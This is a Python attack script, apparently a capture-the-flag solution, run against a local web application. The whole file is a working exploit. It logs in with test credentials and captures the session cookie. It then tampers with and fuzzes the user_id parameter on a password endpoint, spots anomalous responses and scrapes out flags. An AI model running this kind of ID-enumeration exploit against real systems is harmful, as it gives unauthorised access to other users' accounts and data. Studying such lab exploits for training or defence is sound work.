import requests
import re

BASE_URL = "http://127.0.0.1:33029"

# Step 1: Authenticate and capture session from headers
print("[*] Authenticating and extracting session from headers...")
auth_response = requests.post(
    f"{BASE_URL}/",
    data="username=test&password=test",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    allow_redirects=False
)

print(f"[+] Auth status: {auth_response.status_code}")
print(f"[+] All headers: {dict(auth_response.headers)}")

# Get session from Set-Cookie header
set_cookie = auth_response.headers.get('Set-Cookie', '')
print(f"[+] Set-Cookie header: {set_cookie}")

# Parse session manually
session_match = re.search(r'session=([^;]+)', set_cookie)
if session_match:
    session_value = session_match.group(1)
    print(f"[+] Session value: {session_value}")
    
    # Create cookies dict
    cookies = {'session': session_value}
else:
    print("[-] No session found in Set-Cookie")
    cookies = {}

# Step 2: Test with proper session
if cookies:
    print("\n" + "="*60)
    print("[*] Testing with proper session cookie")
    
    test_ids = [10032, 10030, 10031, 10033]
    
    for user_id in test_ids:
        resp = requests.post(
            f"{BASE_URL}/password/test",
            data=f"password=test&user_id={user_id}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies=cookies,
            allow_redirects=False
        )
        
        print(f"\n[+] user_id={user_id}:")
        print(f"    Status: {resp.status_code}")
        print(f"    Location: {resp.headers.get('Location', 'None')}")
        print(f"    Set-Cookie: {resp.headers.get('Set-Cookie', 'None')}")
        
        if resp.status_code == 200:
            # Content is response body
            print(f"    Length: {len(resp.text)}")
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"    [!] FLAG: {flag_match.group(0)}")
            # Check for any differences
            if 'Welcome' in resp.text or 'Hello' in resp.text:
                print(f"    Content: {resp.text[:800]}")
        elif resp.status_code == 302:
            # Follow redirect to see what happens
            loc = resp.headers.get('Location')
            if loc:
                follow_resp = requests.get(f"{BASE_URL}{loc}", cookies=cookies)
                print(f"    After redirect ({follow_resp.status_code}), Length: {len(follow_resp.text)}")
                flag_match = re.search(r'FLAG\{[^}]+\}', follow_resp.text)
                if flag_match:
                    print(f"    [!] FLAG: {flag_match.group(0)}")

# Step 3: Full fuzzing with working session
if cookies:
    print("\n" + "="*60)
    print("[*] FULL FUZZING WITH WORKING SESSION")
    print("="*60)
    
    # Get baseline
    baseline = requests.post(
        f"{BASE_URL}/password/test",
        data="password=test&user_id=10032",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        cookies=cookies,
        allow_redirects=False
    )
    baseline_location = baseline.headers.get('Location', 'N/A')
    print(f"[+] Baseline (10032): Status={baseline.status_code}, Location={baseline_location}")
    
    test_values = []
    # Adjacent values
    test_values.extend([10030, 10031, 10033, 10034, 10035])
    # Near values
    test_values.extend([10000, 10005, 10010, 10015, 10020, 10025, 10040, 10045, 10050, 10055, 10060])
    # Other ranges
    test_values.extend([1, 10, 100, 1000, 9999, 20000, 99999])
    
    print(f"\n[*] Testing {len(test_values)} values...")
    
    for user_id in test_values:
        resp = requests.post(
            f"{BASE_URL}/password/test",
            data=f"password=test&user_id={user_id}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies=cookies,
            allow_redirects=False
        )
        
        location = resp.headers.get('Location', 'N/A')
        
        # Anomaly detection
        is_anomaly = (
            resp.status_code != baseline.status_code or
            location != baseline_location
        )
        
        status = "ANOMALY" if is_anomaly else "-"
        print(f"    user_id={user_id}: Status={resp.status_code}, Location={location} [{status}]")
        
        if is_anomaly:
            print(f"    [!] ANOMALY DETECTED!")
            if resp.status_code == 200:
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    print(f"    [!] FLAG: {flag_match.group(0)}")
                else:
                    print(f"    Response content (first 1000 chars):")
                    print(resp.text[:1000])

else:
    print("[-] Cannot proceed without valid session")

